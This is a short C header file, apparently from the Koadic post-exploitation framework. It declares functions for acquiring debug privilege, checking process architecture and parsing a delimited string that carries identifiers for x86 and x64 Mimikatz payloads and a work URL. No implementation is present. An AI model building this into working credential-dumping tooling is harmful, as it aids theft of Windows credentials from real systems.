#pragma once

#include <Windows.h>

#include "koadic_types.h"

BOOL koadic_get_debug_priv();
BOOL koadic_cpu_matches_process();

// proposed buffalo format:
// UUIDHEADER~~UUIDSHIMX64~~UUIDMIMIKATZX86~~UUIDMIMIKATZ64~~WORKURL
BOOL koadic_parse_shim(LPWSTR buffalo, koadic_shim_parsed *parsed);